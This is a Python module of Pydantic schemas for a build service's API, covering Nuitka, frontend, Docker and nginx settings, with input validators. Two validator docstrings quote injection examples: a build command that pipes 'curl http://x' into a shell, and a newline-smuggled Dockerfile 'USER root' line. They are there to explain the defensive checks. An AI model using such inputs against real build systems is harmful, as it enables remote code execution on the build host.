"""Pydantic schemas for task-related API models."""

import os
import re
from datetime import datetime
from enum import Enum
from typing import Any, Literal

from pydantic import BaseModel, Field, field_validator, model_validator

_VERSION_RE = re.compile(r"[A-Za-z0-9][A-Za-z0-9._+-]{0,63}")


class TaskStatus(str, Enum):
    """Task status enumeration."""

    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


class ProjectType(str, Enum):
    """Project type enumeration."""

    BACKEND_ONLY = "backend_only"      # Pure Python (MCP Server, CLI tools, etc.)
    FRONTEND_ONLY = "frontend_only"    # Pure frontend (React, Vue, etc.)
    FULLSTACK = "fullstack"            # Both frontend and backend


class PackMode(str, Enum):
    """Nuitka packaging mode for dependencies."""

    FULL = "full"          # Nuitka bundles all dependencies
    EXTERNAL = "external"  # Only local code bundled, third-party from libs/


class FrontendBuildTool(str, Enum):
    """Frontend build tool."""

    NPM = "npm"
    YARN = "yarn"
    PNPM = "pnpm"
    BUN = "bun"


class SourceType(str, Enum):
    """Where the project source comes from."""

    LOCAL = "local"  # Existing directory on the server
    GIT = "git"      # Cloned into a per-task workspace before building


# Env values used to be masked before a config was returned to anyone but its
# owner. That is gone on purpose: see _config_for in api/routes/tasks.py for
# why it cost more than it bought. Nothing is left behind, because a masking
# helper sitting unused in the schema reads like a control that is still in
# force.


class BuildConfig(BaseModel):
    """Configuration for a build task."""

    # === Project Type ===
    project_type: ProjectType = Field(
        default=ProjectType.BACKEND_ONLY,
        description="Type of project to build",
    )

    # === Source Selection ===
    source_type: SourceType = Field(
        default=SourceType.LOCAL,
        description="Project source: local directory or git clone",
    )
    git_url: str = Field(
        default="",
        description="Git repository URL (required when source_type is git)",
    )
    git_ref: str = Field(
        default="",
        description="Branch or tag name to clone (required when source_type is git)",
    )
    git_ref_type: Literal["branch", "tag"] = Field(
        default="branch",
        description="Whether git_ref is a branch or a tag",
    )

    # === Common Settings ===
    project_path: str = Field(
        default="",
        description="Absolute path to the project directory on the server (local mode)",
    )

    @model_validator(mode="after")
    def validate_source(self) -> "BuildConfig":
        # Only git mode gets strict validation here — local mode keeps the
        # historical lenient behavior so old history rows still deserialize.
        if self.source_type == SourceType.GIT:
            if not self.git_url.strip():
                raise ValueError("git_url is required when source_type is git")
            if not self.git_ref.strip():
                raise ValueError("git_ref is required when source_type is git")
        return self

    # The version being built (1.2.0, v2.0.0-rc.1). Read from the project when
    # possible; groups a project's builds and is stamped into the output.
    version: str = Field(default="", max_length=64, description="Version of the project being built")
    output_dir: str = Field(
        default="dist",
        description="Output directory name (relative to project)",
    )

    # === Backend Settings (for backend_only and fullstack) ===
    python_version: str = Field(
        default="auto",
        description=(
            "Compile-target Python version. 'auto' (recommended) detects the "
            "real version from the project .venv's compiled .so ABI tags; or a "
            "concrete version like '3.14' to force it."
        ),
    )
    entry_point: str = Field(
        default="main.py",
        description="Main Python script to compile",
    )
    output_name: str = Field(
        default="",
        description="Name of the output executable",
    )
    onefile: bool = Field(
        default=True,
        description="Whether to create a single executable file",
    )
    extra_dirs: str = Field(
        default="",
        description="Comma-separated list of additional Python source directories",
    )
    data_dirs: str = Field(
        default="",
        description="Comma-separated list of data directories to include (static files, templates)",
    )
    pack_mode: PackMode = Field(
        # External is what the console recommends and preselects; an API caller that
        # leaves this out should get the same, not the mode that compiles for hours.
        default=PackMode.EXTERNAL,
        description="Nuitka packaging mode: external (third-party packages in libs/, the default) "
        "or full (everything compiled into the binary; very slow)",
    )
    include_packages: str = Field(
        default="",
        description="Comma-separated list of packages to force-include (for lazy/dynamic imports that Nuitka can't detect)",
    )
    dependency_groups: list[str] = Field(
        default_factory=list,
        description="PEP 735 dependency groups passed to `uv sync --group <name>` during git-mode venv bootstrap",
    )

    # === Frontend Settings (for frontend_only and fullstack) ===
    frontend_dir: str = Field(
        default="frontend",
        description="Frontend directory (relative to project)",
    )
    frontend_build_tool: FrontendBuildTool = Field(
        default=FrontendBuildTool.NPM,
        description="Frontend build tool to use",
    )
    frontend_build_command: str = Field(
        default="build",
        description="Build command (e.g., 'build', 'build:prod')",
    )
    frontend_output_dir: str = Field(
        default="dist",
        description="Frontend build output directory (relative to frontend_dir)",
    )
    frontend_env_filename: str = Field(
        default=".env",
        description="Env filename to write (e.g., .env, .env.production, .env.local)",
    )
    frontend_env_content: str = Field(
        default="",
        max_length=10000,
        description="Content for env file to write before frontend build",
    )

    @field_validator("version")
    @classmethod
    def validate_version(cls, v: str) -> str:
        """A version is stamped into a file name, a Docker tag and a VERSION file,
        so it is kept to the characters all three accept."""
        v = (v or "").strip()
        if v and not _VERSION_RE.fullmatch(v):
            raise ValueError(
                "Version may use letters, digits, '.', '-', '_' and '+', start with a letter "
                "or digit, and be at most 64 characters (e.g. 1.2.0, v2.0.0-rc.1)"
            )
        return v

    @field_validator("frontend_build_command")
    @classmethod
    def validate_build_command(cls, v: str) -> str:
        """Constrain this to an npm script name.

        It is interpolated into `RUN {tool} run {build_command}` in the
        generated Dockerfile, where RUN is shell form — so
        "build; curl http://x | sh" executes during `docker build`, as the
        daemon's user. That is the same capability _render_custom_commands()
        gates behind ALLOWED_COMMAND_PREFIXES, reachable here with no check at
        all.

        npm/yarn/pnpm/bun script names are identifiers; anything that needs a
        shell metacharacter belongs in the project's package.json, not in this
        field.
        """
        v = (v or "").strip()
        if not v:
            return "build"
        if not re.match(r"^[A-Za-z0-9_][A-Za-z0-9_:.-]*$", v):
            raise ValueError(
                "The build command must be a script name from package.json (letters, digits, "
                "underscore, colon, dot, hyphen), e.g. build or build:prod. To combine several "
                "commands, add a script to package.json."
            )
        return v

    @field_validator("frontend_dir", "frontend_output_dir")
    @classmethod
    def validate_frontend_paths(cls, v: str) -> str:
        """Reject path values that could rewrite the generated Dockerfile.

        These land in `COPY {frontend_dir}/ ./` and
        `COPY --from=builder /app/{output_dir} ...`. A newline ends the COPY
        line and starts a new instruction, so "frontend\nUSER root\nRUN ..."
        injects arbitrary build steps.

        ".." is NOT rejected here. Where the output ends up is checked as a
        resolved path by validate_frontend_output_containment below, because
        that is the property that actually matters and a bare segment cannot
        express it.
        """
        v = (v or "").strip()
        if not v:
            return v
        if any(c in v for c in "\n\r\t") or v.startswith("/"):
            raise ValueError(
                "The directory name cannot contain a newline or be an absolute path — it is written into the Dockerfile's COPY instruction."
            )
        return v

    @model_validator(mode="after")
    def validate_frontend_output_containment(self) -> "BuildConfig":
        """The frontend output may sit outside frontend_dir, but not outside the project.

        A frontend that builds into the backend's static directory is written
        as frontend_output_dir="../static/web", and build_dispatcher resolves
        it with normpath on purpose. It is a supported layout and a common one:
        73 of the 698 stored build records use it.

        An earlier version of the field validator above rejected ".." outright.
        That did not just block the layout — BuildConfig is what every stored
        config is read back through, so 73 history records could no longer be
        deserialised and the history list failed for everyone who had one.

        What has to hold is that the resolved directory stays inside the
        project: it becomes a COPY --from=builder source, and in frontend-only
        builds it is the rmtree target.
        """
        if not self.frontend_output_dir:
            return self

        combined = os.path.normpath(
            os.path.join(self.frontend_dir or "", self.frontend_output_dir)
        )
        if combined == ".." or combined.startswith(".." + os.sep) or os.path.isabs(combined):
            raise ValueError(
                f"The frontend output directory '{self.frontend_output_dir}' falls outside the "
                f"project (it resolves to '{combined}'). It is copied into the image and emptied "
                f"before each build, so it must stay inside the project."
            )
        return self

    @field_validator("docker_volumes")
    @classmethod
    def validate_docker_volumes(cls, v: str | None) -> str | None:
        if v is None:
            return None
        from app.services.docker_worker import parse_volumes

        parse_volumes(v)  # raises ValueError naming the bad entry
        return v

    @field_validator("frontend_env_filename")
    @classmethod
    def validate_env_filename(cls, v: str) -> str:
        import re
        if not re.match(r"^\.env(\.\w+)*$", v):
            raise ValueError("Invalid env filename. Must be .env or .env.* (e.g. .env.production)")
        return v

    # === Docker Output ===
    docker_enabled: bool = Field(
        default=False,
        description="Whether to package output as a Docker image",
    )

    # === Docker Settings (when docker_enabled) ===
    docker_image_name: str = Field(
        default="",
        description="Docker image name (e.g., 'myapp:latest')",
    )
    docker_base_image: str = Field(
        default="python:3.13-slim",
        description="Base Docker image",
    )
    docker_expose_port: int = Field(
        default=8000,
        description="Port to expose in Docker",
    )
    docker_env_vars: str = Field(
        default="",
        description="Docker environment variables, one KEY=VALUE per line, each becomes an ENV instruction",
    )
    docker_custom_commands: str = Field(
        default="",
        description="Custom shell commands, one per line, each becomes a RUN instruction",
    )
    docker_install_node: bool = Field(
        default=False,
        description="Install Node.js in Docker image",
    )
    docker_api_proxy: str = Field(
        default="",
        description="Backend API URL for nginx reverse proxy (e.g., http://backend:8000)",
    )
    docker_volumes: str | None = Field(
        default=None,
        description=(
            "Folders the program keeps its state in, comma- or newline-separated, relative to the "
            "image's /app or absolute. Each becomes a VOLUME, owned by the program's user. None = "
            "not set yet: the folders the program created during the smoke run are used, and saved "
            "here for the next build"
        ),
    )
    docker_run_as_root: bool = Field(
        default=False,
        description="Run the program as root inside a backend image (default: a non-root user, uid 10001)",
    )

    # === Nginx Settings (frontend-only Docker image) ===
    nginx_client_max_body_size: str = Field(
        default="",
        description="nginx client_max_body_size (empty = worker default '0' = unlimited)",
    )
    nginx_proxy_read_timeout: str = Field(
        default="",
        description=(
            "nginx proxy_read_timeout — how long the backend may stay SILENT "
            "before nginx gives up (empty = '300s'). This is an IDLE timeout, "
            "not a cap on total request duration: a slow-but-streaming response "
            "is never cut. It is the setting that kills long single-shot calls "
            "such as speech-to-text, which return nothing until they finish."
        ),
    )
    nginx_streaming: bool = Field(
        default=True,
        description=(
            "Disable nginx's request/response buffering for the proxied API. "
            "Required for SSE or chunked streaming (LLM token-by-token output) "
            "— with buffering on, nginx holds the whole response and the client "
            "sees nothing until it completes. Also lets large uploads (audio for "
            "STT) reach the backend as they arrive instead of after the whole "
            "body is received."
        ),
    )
    nginx_gzip: bool = Field(
        default=True,
        description="Enable gzip compression in the generated nginx config",
    )

    # === Nuitka Performance Settings ===
    nuitka_jobs: int = Field(
        default=0,
        ge=0,
        description="Parallel C compile jobs for Nuitka. 0 = auto: every core when the build runs alone, an equal share of the cores (at least 4) when other builds run at the same time",
    )

    # === Nuitka Optimization / Diagnostics ===
    enable_anti_bloat: bool = Field(
        default=True,
        description="Keep Nuitka's anti-bloat plugin enabled (trims unused heavy imports)",
    )
    include_package_data: str = Field(
        default="",
        description="Comma-separated packages whose data files Nuitka should bundle (--include-package-data)",
    )
    generate_report: bool = Field(
        default=False,
        description="Generate a Nuitka compilation report XML in the output directory",
    )
    verify_after_build: bool = Field(
        default=True,
        description="Smoke-test the produced binary after a successful build",
    )


class TaskCreate(BaseModel):
    """Request model for creating a new task."""

    project_name: str = Field(
        ...,
        min_length=1,
        description="Display name for the project",
    )
    config: BuildConfig
    # The project this is a version of; without one, the build is filed under the
    # project with its name and source (created if there is none).
    project_id: int | None = None
    user_name: str | None = Field(default=None, exclude=True)


class TaskUpdate(BaseModel):
    """Request model for updating a task."""

    status: TaskStatus | None = None
    progress: int | None = Field(default=None, ge=0, le=100)
    status_msg: str | None = None


class PreflightCheck(BaseModel):
    """A single pre-build sanity check."""

    label: str
    passed: bool
    detail: str = ""
    critical: bool = False


class CompileCacheSummary(BaseModel):
    """What the C compile cache did for one build."""

    hits: int = 0
    compiled: int = 0


class ArtifactInfo(BaseModel):
    """Summary of the produced build artifact."""

    path: str
    size_bytes: int = 0
    size_human: str = ""
    file_count: int = 0
    sha256: str | None = None


class ImageInfo(BaseModel):
    """The Docker image a build produced."""

    name: str
    size_bytes: int | None = None
    # The suggested `docker run`, with the port published and a named volume
    # per state folder.
    run_command: str = ""
    volumes: list[str] = Field(default_factory=list)
    user: str = ""


class ListenerInfo(BaseModel):
    port: int
    address: str


class PortCheck(BaseModel):
    """The ports the program listened on against the image's EXPOSE/PORT.
    A suggestion only: the setting is never changed for the user."""

    listening: list[int] = Field(default_factory=list)
    expected: int
    suggested: int | None = None
    message: str = ""


class VerifyResult(BaseModel):
    """Outcome of the post-build smoke test."""

    status: Literal["pass", "warn", "fail", "skipped"]
    detail: str = ""
    exit_code: int | None = None
    # Folders the program created where it ran (relative names): what a Docker
    # build declares as volumes when none are set.
    created_dirs: list[str] = Field(default_factory=list)
    # What was started: the binary on the build host, or the Docker image.
    target: Literal["binary", "image"] | None = None
    # The smoke container's name, for an image test (it is removed afterwards).
    container: str | None = None
    # TCP ports the program listened on during the run.
    listeners: list[ListenerInfo] = Field(default_factory=list)


class DiagnosisAction(BaseModel):
    """A one-click fix a diagnosis can offer.

    Deliberately expressed as config overrides rather than UI instructions: a
    rule declares WHAT should change, and the frontend decides how to present
    it. Adding a fix to a new rule is then a line of data, not a component.

    The rebuild flow already carries a config into the create form, so applying
    one of these is just that flow with `overrides` merged on top.
    """

    label: str = Field(description="Button text, e.g. 'Rebuild with auto-detect'")
    overrides: dict = Field(
        default_factory=dict,
        description="BuildConfig fields to change before rebuilding",
    )


class Diagnosis(BaseModel):
    """A human-friendly explanation of a known build failure, produced by
    error_diagnosis.diagnose_build_failure from scanning the build log."""

    problem: str
    suggestion: str
    evidence: str = ""
    # Present only when the fix is something the platform can apply itself.
    # Most failures are in the user's own code and have no button.
    action: DiagnosisAction | None = None


class BuildResult(BaseModel):
    """Structured build outcome attached to a task (built up incrementally)."""

    preflight: list[PreflightCheck] = Field(default_factory=list)
    artifact: ArtifactInfo | None = None
    verify: VerifyResult | None = None
    report_file: str | None = None
    duration_seconds: float | None = None
    # Populated on failure: recognized failure patterns + how to fix them.
    # Always non-empty for a failed build — when no pattern matches, it carries
    # the failing stage and a pointer to the error lines below, so a user is
    # never shown a bare "failed" with nothing to act on.
    diagnosis: list[Diagnosis] = Field(default_factory=list)
    # The log lines that most likely explain the failure, oldest first. Kept
    # separate from the diagnosis so the UI can show them verbatim — someone
    # who cannot interpret them can still forward them to an admin.
    error_lines: list[str] = Field(default_factory=list)
    # Which build stage was active when it failed (preflight/compile/...).
    failed_stage: str | None = None
    # C files Nuitka took from ccache vs. compiled (app/services/compile_cache).
    # None when the build compiled without ccache.
    compile_cache: CompileCacheSummary | None = None
    # The image, for Docker builds.
    image: ImageInfo | None = None
    # Docker builds: did the program listen on the exposed port?
    port_check: PortCheck | None = None


class TaskResponse(BaseModel):
    """Response model for a task."""

    id: str
    user_name: str
    project_name: str
    python_version: str
    status: TaskStatus
    progress: int = 0
    status_msg: str = ""
    stage: str = ""
    created_at: datetime
    updated_at: datetime | None = None
    config: BuildConfig
    logs: list[str] = Field(default_factory=list)
    result: BuildResult | None = None
    project_id: int | None = None


class HistoryItem(BaseModel):
    """Response model for history records."""

    task_id: str
    user_name: str
    project_name: str
    python_version: str
    start_time: datetime
    end_time: datetime | None = None
    status: TaskStatus
    output_dir: str
    config: BuildConfig | None = None
    result: BuildResult | None = None
    project_id: int | None = None


class WebSocketMessage(BaseModel):
    """WebSocket message model."""

    type: str = Field(
        ...,
        description="Message type: log, status, progress, error",
    )
    task_id: str
    data: Any
    timestamp: datetime = Field(default_factory=datetime.now)
